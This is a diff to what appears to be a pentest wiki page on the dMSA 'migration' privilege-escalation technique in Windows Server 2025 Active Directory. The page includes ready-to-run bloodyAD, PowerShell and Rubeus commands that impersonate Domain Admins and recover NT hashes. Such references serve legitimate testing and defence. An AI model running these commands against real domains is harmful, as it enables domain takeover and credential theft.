@@ -7,7 +7,7 @@ category: ad
 
 This abuse can be carried out when controlling an object that has `CreateChild` rights (for `msDS-DelegatedManagedServiceAccount` objects) over an Organizational Unit (OU), or write access to the `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState` attributes of an existing delegated Managed Service Account (dMSA).
 
-The attacker can then impersonate any Active Directory principal — including Domain Admins — by abusing the dMSA migration mechanism (CVE-2025-29810).
+The attacker can then impersonate any Active Directory principal including Domain Admins by abusing the dMSA migration mechanism (CVE-2025-29810).
 
 > [!WARNING] Windows Server 2025 requirement
 >
@@ -17,10 +17,10 @@ The attacker can then impersonate any Active Directory principal — including D
 
 Delegated Managed Service Accounts (dMSAs) are a new account type introduced in Windows Server 2025, designed to supersede existing machine or service accounts during migrations. During the migration process, two LDAP attributes control the behavior of the dMSA:
 
-* `msDS-ManagedAccountPrecededByLink` — stores the Distinguished Name of the account being superseded.
-* `msDS-DelegatedMSAState` — tracks the migration state (`1` = in progress, `2` = completed).
+* `msDS-ManagedAccountPrecededByLink` stores the Distinguished Name of the account being superseded.
+* `msDS-DelegatedMSAState` tracks the migration state (`1` = in progress, `2` = completed).
 
-When a dMSA authenticates and the state is marked as completed (`2`), the KDC builds the Privilege Attribute Certificate (PAC) by including the SIDs of the account referenced in `msDS-ManagedAccountPrecededByLink` — **without verifying that an actual migration took place**. This means a TGT issued for the dMSA carries the group memberships and privileges of the linked account.
+When a dMSA authenticates and the state is marked as completed (`2`), the KDC builds the Privilege Attribute Certificate (PAC) by including the SIDs of the account referenced in `msDS-ManagedAccountPrecededByLink` **without verifying that an actual migration took place**. This means a TGT issued for the dMSA carries the group memberships and privileges of the linked account.
 
 An attacker with `CreateChild` on any OU can:
 1. Create a new dMSA in that OU.
@@ -90,24 +90,24 @@ The exploitation chain has three stages: creating the dMSA, manipulating its mig
 From UNIX-like systems, [bloodyAD](https://github.com/CravateRouge/bloodyAD) can perform all three stages.
 
 ```bash
-# Step 1 — Create a dMSA in an OU where CreateChild rights are held
+# Step 1 Create a dMSA in an OU where CreateChild rights are held
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" \
     add dMSA "$DMSA_NAME" --ou "$OU_DN"
 
-# Step 2 — Link the dMSA to the target account
+# Step 2 Link the dMSA to the target account
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" \
     set object "$DMSA_NAME$" --attr msDS-ManagedAccountPrecededByLink \
     -v "$TARGET_DN"
 
-# Step 3 — Mark the migration as completed
+# Step 3 Mark the migration as completed
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" \
     set object "$DMSA_NAME$" --attr msDS-DelegatedMSAState -v 2
 ```
 
 Where:
-* `$DMSA_NAME` — an arbitrary name for the dMSA to create (e.g., `evil-dmsa`).
-* `$OU_DN` — Distinguished Name of the OU where `CreateChild` rights are held (e.g., `OU=ServiceAccounts,DC=domain,DC=local`).
-* `$TARGET_DN` — Distinguished Name of the account to impersonate (e.g., `CN=Administrator,CN=Users,DC=domain,DC=local`).
+* `$DMSA_NAME` an arbitrary name for the dMSA to create (e.g., `evil-dmsa`).
+* `$OU_DN` Distinguished Name of the OU where `CreateChild` rights are held (e.g., `OU=ServiceAccounts,DC=domain,DC=local`).
+* `$TARGET_DN` Distinguished Name of the account to impersonate (e.g., `CN=Administrator,CN=Users,DC=domain,DC=local`).
 
 Once the attributes are set, a TGT can be requested for the dMSA using [minikerberos](https://github.com/skelsec/minikerberos) or [impacket](https://github.com/fortra/impacket). The resulting PAC will contain the target's SIDs and group memberships.
 
@@ -131,16 +131,16 @@ SharpSuccessor.exe -action exploit -target "$TARGET_DN" -ou "$OU_DN"
 Alternatively, the steps can be performed manually with the Active Directory PowerShell module and [Rubeus](https://github.com/GhostPack/Rubeus).
 
 ```powershell
-# Step 1 — Create the dMSA
+# Step 1 Create the dMSA
 New-ADServiceAccount -Name "$DMSA_NAME" -Path "$OU_DN" -DNSHostName "$DMSA_NAME.$DOMAIN"
 
-# Step 2 — Set migration attributes
+# Step 2 Set migration attributes
 Set-ADServiceAccount -Identity "$DMSA_NAME" -Replace @{
     'msDS-ManagedAccountPrecededByLink' = "$TARGET_DN"
     'msDS-DelegatedMSAState'            = 2
 }
 
-# Step 3 — Request a TGT as the dMSA; PAC contains the target's SIDs
+# Step 3 Request a TGT as the dMSA; PAC contains the target's SIDs
 Rubeus.exe asktgt /user:"$DMSA_NAME$" /dmsa /dc:"$DC_IP" /ptt
 ```
 
@@ -150,7 +150,7 @@ The `/ptt` flag injects the ticket directly into the current session. Access can
 
 > [!TIP] Credential extraction via KERB-DMSA-KEY-PACKAGE
 >
-> When the KDC issues a TGT for a dMSA, it returns a `KERB-DMSA-KEY-PACKAGE` structure containing the superseded account's RC4-HMAC (NT hash) in the `previous-keys` field. This allows the attacker to recover the target account's NT hash directly from the TGT response — similar in impact to a targeted DCSync — without ever touching the DC directly.
+> When the KDC issues a TGT for a dMSA, it returns a `KERB-DMSA-KEY-PACKAGE` structure containing the superseded account's RC4-HMAC (NT hash) in the `previous-keys` field. This allows the attacker to recover the target account's NT hash directly from the TGT response similar in impact to a targeted DCSync without ever touching the DC directly.
 
 ## Resources
 
